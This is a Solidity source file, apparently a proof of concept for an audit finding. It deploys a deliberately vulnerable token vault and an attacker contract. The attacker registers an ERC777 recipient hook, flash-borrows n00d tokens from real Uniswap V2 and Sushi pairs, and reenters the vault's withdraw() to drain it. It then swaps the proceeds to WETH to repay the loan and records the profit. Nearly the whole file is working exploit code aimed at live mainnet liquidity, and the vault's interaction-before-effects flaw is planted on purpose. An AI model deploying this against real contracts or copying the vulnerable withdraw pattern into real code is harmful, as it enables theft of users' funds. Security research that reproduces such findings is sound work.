// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
    function getInterfaceImplementer(address account, bytes32 interfaceHash) external view returns (address);
}

interface IERC1820Implementer {
    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account) external view returns (bytes32);
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

/*
    Toy integrator used to preserve the F-002 causality:

    1. It treats n00d as a normal ERC20 and uses `transferFrom()` during `deposit()` / `donate()`.
    2. It later uses ERC20-looking `transfer()` during `withdraw()`.
    3. n00d routes both entrypoints through ERC777 `_send(..., false)`, so a registered
       `ERC777TokensRecipient` can reenter `withdraw()` before the vault finalizes share accounting.

    The public flashswap and AMM unwind below are only realistic funding / repayment steps.
    They do not change the exploit root cause, which remains the callback-enabled n00d
    transfer during the vault's state-changing withdraw flow.
*/
contract VulnerableN00dVault {
    IERC20Like internal immutable TOKEN;

    mapping(address => uint256) public shares;

    constructor(address token_) {
        TOKEN = IERC20Like(token_);
    }

    function deposit(uint256 amount) external {
        require(amount != 0, "deposit=0");
        require(TOKEN.transferFrom(msg.sender, address(this), amount), "deposit transfer failed");
        shares[msg.sender] += amount;
    }

    function donate(uint256 amount) external {
        require(amount != 0, "donate=0");
        require(TOKEN.transferFrom(msg.sender, address(this), amount), "donation transfer failed");
    }

    function withdraw(uint256 amount) external {
        uint256 credited = shares[msg.sender];
        require(credited >= amount, "insufficient shares");

        // Interaction before effects: n00d `transfer()` reaches ERC777 `_send()`,
        // which can invoke the recipient hook before `shares[msg.sender]` is reduced.
        require(TOKEN.transfer(msg.sender, amount), "withdraw transfer failed");
        shares[msg.sender] = credited - amount;
    }

    function liquidBalance() external view returns (uint256) {
        return TOKEN.balanceOf(address(this));
    }
}

contract FlawVerifier is IERC1820Implementer, IERC777Recipient {
    struct PairInfo {
        address pair;
        address quoteToken;
        uint256 reserveNood;
        uint256 reserveQuote;
        bool noodIsToken0;
    }

    struct Hop {
        address pair;
        address tokenIn;
        address tokenOut;
        bool tokenInIsToken0;
    }

    struct RoutePlan {
        address borrowPair;
        uint256 borrowAmount;
        uint256 repayWethAmount;
        uint256 expectedWethOut;
        bool borrowNoodIsToken0;
        uint256 slices;
        Hop firstHop;
        Hop secondHop;
        bool viable;
    }

    address internal constant NOOD = 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address internal constant MIM = 0x99d8a9C45b2eCB0bbe1a173e4797cDA5f8997AEB;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    bytes32 internal constant ERC1820_ACCEPT_MAGIC = keccak256("ERC1820_ACCEPT_MAGIC");
    bytes32 internal constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    uint256 internal constant MAX_NOOD_PAIRS = 16;
    uint256 internal constant REENTRANCY_SLICES = 8;

    VulnerableN00dVault public vault;

    bool public executed;
    bool public hookRegistered;
    bool public hookObserved;
    bool public reentered;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public transferFromLegUsed;
    bool public transferLegUsed;
    bool public flashswapUsed;

    uint256 public startingBalance;
    uint256 public endingBalance;
    uint256 public depositedAmount;
    uint256 public donatedLiquidity;
    uint256 public reenteredWithdrawAmount;
    uint256 public hookCallCount;
    uint256 internal realizedProfit;
    uint256 internal reentriesRemaining;

    string public exploitPathUsed;
    string public concreteInfeasibility;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        exploitPathUsed =
            "integrator uses n00d transferFrom() and later transfer() as if they were callback-free ERC20 operations; attacker registers an ERC1820 ERC777TokensRecipient hook; a public UniswapV2/Sushi-like n00d/WETH flashswap deterministically funds the local vault; during withdraw n00d still routes transfer() through ERC777 _send(..., false), credits the attacker, invokes tokensReceived(), and the hook reenters withdraw before shares are finalized; the recovered n00d is then unwound only through pre-existing UniswapV2/Sushi-like liquidity back into WETH to settle the flashswap";

        _registerRecipientHook();
        vault = new VulnerableN00dVault(NOOD);

        RoutePlan memory plan = _findBestRoute();
        if (!plan.viable) {
            concreteInfeasibility =
                "No profitable UniswapV2/Sushi-like unwind route was discoverable from the live n00d/WETH source pair into any pre-existing n00d/WETH or n00d/<quote> pair plus a public <quote>/WETH bridge at the fork block, so the verifier could not settle the flashswap without inventing off-context liquidity.";
            hypothesisRefuted = true;
            return;
        }

        flashswapUsed = true;
        startingBalance = IERC20Like(WETH).balanceOf(address(this));

        bytes memory data = abi.encode(plan);
        if (plan.borrowNoodIsToken0) {
            IUniswapV2PairLike(plan.borrowPair).swap(plan.borrowAmount, 0, address(this), data);
        } else {
            IUniswapV2PairLike(plan.borrowPair).swap(0, plan.borrowAmount, address(this), data);
        }

        endingBalance = IERC20Like(WETH).balanceOf(address(this));
        if (endingBalance > startingBalance) {
            realizedProfit = endingBalance - startingBalance;
        }

        hypothesisValidated = hookRegistered && hookObserved && reentered && transferFromLegUsed && transferLegUsed;
        hypothesisRefuted = !hypothesisValidated || realizedProfit == 0;

        if (realizedProfit == 0 && bytes(concreteInfeasibility).length == 0) {
            concreteInfeasibility =
                "The ERC777 recipient-hook reentrancy reproduced correctly, but every discovered UniswapV2/Sushi-like exit route still failed to leave residual WETH after repaying the flashswapped n00d/WETH source pair at the fork block.";
        }
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        RoutePlan memory plan = abi.decode(data, (RoutePlan));
        require(msg.sender == plan.borrowPair, "unexpected pair");

        uint256 borrowedNood = amount0 != 0 ? amount0 : amount1;
        require(borrowedNood == plan.borrowAmount, "unexpected amount");

        IERC20Like nood = IERC20Like(NOOD);
        require(nood.approve(address(vault), type(uint256).max), "approve failed");

        uint256 amountForVault = _floorToMultiple(borrowedNood, plan.slices);
        require(amountForVault != 0, "borrow too small");

        depositedAmount = amountForVault / plan.slices;
        donatedLiquidity = amountForVault - depositedAmount;
        reenteredWithdrawAmount = depositedAmount;
        reentriesRemaining = plan.slices - 1;

        transferFromLegUsed = true;
        vault.deposit(depositedAmount);

        if (donatedLiquidity != 0) {
            vault.donate(donatedLiquidity);
        }

        transferLegUsed = true;
        vault.withdraw(depositedAmount);

        uint256 noodBalance = nood.balanceOf(address(this));
        require(noodBalance >= borrowedNood, "nood not recovered");

        uint256 wethOut = _executeHop(plan.firstHop, borrowedNood);
        if (plan.secondHop.pair != address(0)) {
            wethOut = _executeHop(plan.secondHop, wethOut);
        }

        require(wethOut >= plan.repayWethAmount, "route below repay");
        require(IERC20Like(WETH).transfer(plan.borrowPair, plan.repayWethAmount), "repay transfer failed");
    }

    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account)
        external
        view
        override
        returns (bytes32)
    {
        if (account == address(this) && interfaceHash == TOKENS_RECIPIENT_INTERFACE_HASH) {
            return ERC1820_ACCEPT_MAGIC;
        }
        return bytes32(0);
    }

    function tokensReceived(
        address,
        address from,
        address to,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        require(msg.sender == NOOD, "unexpected token");
        require(to == address(this), "unexpected recipient");

        // Ignore the initial flashswap transfer from the AMM source venue. The exploit signal is the
        // vault-to-attacker n00d `transfer()` performed inside the vulnerable withdraw flow.
        if (from != address(vault)) {
            return;
        }

        hookObserved = true;
        hookCallCount += 1;

        if (!reentered) {
            reentered = true;
        }

        if (reentriesRemaining != 0 && vault.liquidBalance() >= reenteredWithdrawAmount) {
            reentriesRemaining -= 1;
            vault.withdraw(reenteredWithdrawAmount);
        }
    }

    function profitToken() external view returns (address) {
        return realizedProfit == 0 ? address(0) : WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _findBestRoute() internal view returns (RoutePlan memory bestPlan) {
        PairInfo[MAX_NOOD_PAIRS] memory pairs;
        uint256 pairCount = _loadNoodPairs(pairs);
        uint256[16] memory borrowBps =
            [uint256(1), 2, 5, 10, 20, 30, 40, 50, 75, 100, 150, 200, 300, 500, 750, 1000];

        for (uint256 i = 0; i < pairCount; ++i) {
            PairInfo memory source = pairs[i];
            if (source.quoteToken != WETH) {
                continue;
            }

            for (uint256 k = 0; k < borrowBps.length; ++k) {
                uint256 rawBorrow = (source.reserveNood * borrowBps[k]) / 10_000;
                uint256 borrowAmount = _floorToMultiple(rawBorrow, REENTRANCY_SLICES);
                if (borrowAmount == 0 || borrowAmount >= source.reserveNood) {
                    continue;
                }

                uint256 repayWeth = _getAmountIn(borrowAmount, source.reserveQuote, source.reserveNood);
                bestPlan = _considerV2Sinks(source, pairs, pairCount, borrowAmount, repayWeth, bestPlan);
            }
        }
    }

    function _considerV2Sinks(
        PairInfo memory source,
        PairInfo[MAX_NOOD_PAIRS] memory pairs,
        uint256 pairCount,
        uint256 borrowAmount,
        uint256 repayWeth,
        RoutePlan memory bestPlan
    ) internal view returns (RoutePlan memory) {
        for (uint256 j = 0; j < pairCount; ++j) {
            PairInfo memory sink = pairs[j];
            if (sink.pair == source.pair) {
                continue;
            }

            uint256 quoteOut = _getAmountOut(borrowAmount, sink.reserveNood, sink.reserveQuote);
            RoutePlan memory candidate = _finalizeCandidate(
                source,
                borrowAmount,
                repayWeth,
                Hop({pair: sink.pair, tokenIn: NOOD, tokenOut: sink.quoteToken, tokenInIsToken0: sink.noodIsToken0}),
                quoteOut
            );
            if (_better(candidate, bestPlan)) {
                bestPlan = candidate;
            }
        }
        return bestPlan;
    }

    function _finalizeCandidate(
        PairInfo memory source,
        uint256 borrowAmount,
        uint256 repayWeth,
        Hop memory firstHop,
        uint256 firstHopOut
    ) internal view returns (RoutePlan memory candidate) {
        if (firstHopOut == 0) {
            return candidate;
        }

        uint256 wethOut = firstHopOut;
        Hop memory secondHop;

        if (firstHop.tokenOut != WETH) {
            (secondHop, wethOut) = _bestBridgeToWeth(firstHop.tokenOut, firstHopOut);
            if (secondHop.pair == address(0) || wethOut == 0) {
                return candidate;
            }
        }

        if (wethOut <= repayWeth) {
            return candidate;
        }

        candidate = RoutePlan({
            borrowPair: source.pair,
            borrowAmount: borrowAmount,
            repayWethAmount: repayWeth,
            expectedWethOut: wethOut,
            borrowNoodIsToken0: source.noodIsToken0,
            slices: REENTRANCY_SLICES,
            firstHop: firstHop,
            secondHop: secondHop,
            viable: true
        });
    }

    function _bestBridgeToWeth(address tokenIn, uint256 amountIn) internal view returns (Hop memory bestHop, uint256 bestOut) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 i = 0; i < factories.length; ++i) {
            address pair = IUniswapV2FactoryLike(factories[i]).getPair(tokenIn, WETH);
            if (pair == address(0) || pair.code.length == 0) {
                continue;
            }

            (uint256 reserveIn, uint256 reserveOut, bool tokenInIsToken0) = _normalizePair(pair, tokenIn, WETH);
            if (reserveIn == 0 || reserveOut == 0) {
                continue;
            }

            uint256 wethOut = _getAmountOut(amountIn, reserveIn, reserveOut);
            if (wethOut > bestOut) {
                bestOut = wethOut;
                bestHop = Hop({pair: pair, tokenIn: tokenIn, tokenOut: WETH, tokenInIsToken0: tokenInIsToken0});
            }
        }
    }

    function _loadNoodPairs(PairInfo[MAX_NOOD_PAIRS] memory pairs) internal view returns (uint256 pairCount) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[8] memory quotes = [WETH, USDC, USDT, DAI, WBTC, FRAX, FEI, MIM];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < quotes.length; ++j) {
                address quote = quotes[j];
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(NOOD, quote);
                if (pair == address(0) || pair.code.length == 0 || _containsPair(pairs, pairCount, pair)) {
                    continue;
                }

                (uint256 reserveNood, uint256 reserveQuote, bool noodIsToken0) = _normalizePair(pair, NOOD, quote);
                if (reserveNood == 0 || reserveQuote == 0) {
                    continue;
                }

                pairs[pairCount] = PairInfo({
                    pair: pair,
                    quoteToken: quote,
                    reserveNood: reserveNood,
                    reserveQuote: reserveQuote,
                    noodIsToken0: noodIsToken0
                });
                pairCount += 1;
                if (pairCount == MAX_NOOD_PAIRS) {
                    return pairCount;
                }
            }
        }
    }

    function _normalizePair(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut, bool tokenInIsToken0)
    {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();

        if (token0 == tokenIn && token1 == tokenOut) {
            return (uint256(reserve0), uint256(reserve1), true);
        }
        if (token1 == tokenIn && token0 == tokenOut) {
            return (uint256(reserve1), uint256(reserve0), false);
        }

        return (0, 0, false);
    }

    function _executeHop(Hop memory hop, uint256 amountIn) internal returns (uint256 amountOut) {
        require(hop.pair != address(0), "unsupported hop");
        return _swapExactInputViaV2Pair(hop.tokenIn, hop.pair, hop.tokenInIsToken0, amountIn);
    }

    function _swapExactInputViaV2Pair(address tokenIn, address pair, bool tokenInIsToken0, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        uint256 reserveIn = tokenInIsToken0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveOut = tokenInIsToken0 ? uint256(reserve1) : uint256(reserve0);
        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);

        require(IERC20Like(tokenIn).transfer(pair, amountIn), "swap transfer failed");
        if (tokenInIsToken0) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), "");
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), "");
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountOut)
    {
        require(amountIn != 0, "insufficient input");
        require(reserveIn != 0 && reserveOut != 0, "insufficient liquidity");

        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountIn)
    {
        require(amountOut != 0, "insufficient output");
        require(reserveIn != 0 && reserveOut != 0 && amountOut < reserveOut, "insufficient liquidity");

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function _floorToMultiple(uint256 value, uint256 multiple) internal pure returns (uint256) {
        if (multiple == 0) {
            return value;
        }
        return value - (value % multiple);
    }

    function _containsPair(PairInfo[MAX_NOOD_PAIRS] memory pairs, uint256 pairCount, address pair)
        internal
        pure
        returns (bool)
    {
        for (uint256 i = 0; i < pairCount; ++i) {
            if (pairs[i].pair == pair) {
                return true;
            }
        }
        return false;
    }

    function _better(RoutePlan memory candidate, RoutePlan memory bestPlan) internal pure returns (bool) {
        if (!candidate.viable) {
            return false;
        }
        if (!bestPlan.viable) {
            return true;
        }
        return candidate.expectedWethOut - candidate.repayWethAmount
            > bestPlan.expectedWethOut - bestPlan.repayWethAmount;
    }

    function _registerRecipientHook() internal {
        if (hookRegistered) {
            return;
        }

        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        hookRegistered = ERC1820.getInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH) == address(this);
        require(hookRegistered, "hook registration failed");
    }
}
